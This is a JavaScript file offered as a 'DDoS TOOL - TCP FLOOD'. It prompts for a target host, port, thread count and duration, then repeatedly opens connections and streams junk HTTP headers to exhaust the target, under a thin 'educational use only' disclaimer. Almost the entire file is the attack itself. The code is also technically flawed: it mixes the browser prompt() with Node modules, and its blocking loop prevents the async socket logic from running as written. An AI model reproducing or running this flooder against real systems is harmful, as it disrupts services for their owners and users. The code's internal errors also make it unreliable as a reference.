// ******************************************************************************
// * WARNING: THIS TOOL IS FOR EDUCATIONAL AND TESTING PURPOSES ONLY!        *
// * ILLEGAL USE IS STRICTLY PROHIBITED. THE CREATOR IS NOT RESPONSIBLE FOR *
// * ANY DAMAGE CAUSED BY MISUSE OF THIS TOOL. USE AT YOUR OWN RISK!          *
// ******************************************************************************

// ******************************************************************************
// *                  DDoS TOOL - TCP FLOOD - v1.0                             *
// ******************************************************************************

// Configuration
const targetURL = prompt("Enter target URL (including http/https):");
const targetHost = new URL(targetURL).hostname;
const port = parseInt(prompt("Enter target port (e.g., 80, 443):"));
const threads = parseInt(prompt("Enter number of threads (high values may cause system instability):"));
const duration = parseInt(prompt("Enter duration in seconds:"));
const logFile = "ddos_log.txt"; // Log file name

// Colors (ANSI escape codes)
const darkGreen = "\x1b[32m";
const purple = "\x1b[35m";
const darkRed = "\x1b[31m";
const darkBlue = "\x1b[34m";
const resetColor = "\x1b[0m";

// Logging function
function log(message) {
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] ${message}\n`;
  console.log(`${darkGreen}[LOG] ${message}${resetColor}`);
  // Simple file logging (Node.js environment)
  try {
    const fs = require('fs');
    fs.appendFileSync(logFile, logEntry);
  } catch (error) {
    console.error(`${darkRed}[ERROR] Failed to write to log file: ${error}${resetColor}`);
  }
}

// TCP Flood function
async function tcpFlood(threadId) {
  const net = require('net');
  const startTime = Date.now();

  log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port}${resetColor}`);

  while (Date.now() - startTime < duration * 1000) {
    try {
      const socket = net.createConnection({ host: targetHost, port: port }, () => {
        log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);
        // Send garbage data
        socket.write("GET / HTTP/1.1\r\n");
        socket.write(`Host: ${targetHost}\r\n`);
        socket.write("Connection: keep-alive\r\n");
        socket.write("Cache-Control: max-age=0\r\n");
        socket.write("Upgrade-Insecure-Requests: 1\r\n");
        socket.write("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n");
        socket.write("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n");
        socket.write("Accept-Encoding: gzip, deflate\r\n");
        socket.write("Accept-Language: en-US,en;q=0.9\r\n\r\n");

        // Keep sending data
        setInterval(() => {
          try {
            socket.write("X-Flooder: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n");
          } catch (writeError) {
            log(`${darkRed}[THREAD ${threadId}] Error writing to socket: ${writeError}${resetColor}`);
            socket.destroy();
          }
        }, 10); // Send data every 10ms
      });

      socket.on('error', (err) => {
        log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
        socket.destroy();
      });

      socket.on('close', () => {
        log(`${darkBlue}[THREAD ${threadId}] Socket closed${resetColor}`);
      });

    } catch (connectError) {
      log(`${darkRed}[THREAD ${threadId}] Connection error: ${connectError}${resetColor}`);
    }
  }

  log(`${purple}[THREAD ${threadId}] TCP flood finished${resetColor}`);
}

// Main execution
async function main() {
  log(`${darkGreen}[MAIN] Starting DDoS attack against ${targetHost}:${port} with ${threads} threads for ${duration} seconds${resetColor}`);

  for (let i = 0; i < threads; i++) {
    tcpFlood(i + 1);
  }

  setTimeout(() => {
    log(`${darkGreen}[MAIN] Attack completed. Check ${logFile} for details.${resetColor}`);
    process.exit(0);
  }, duration * 1000);
}

main();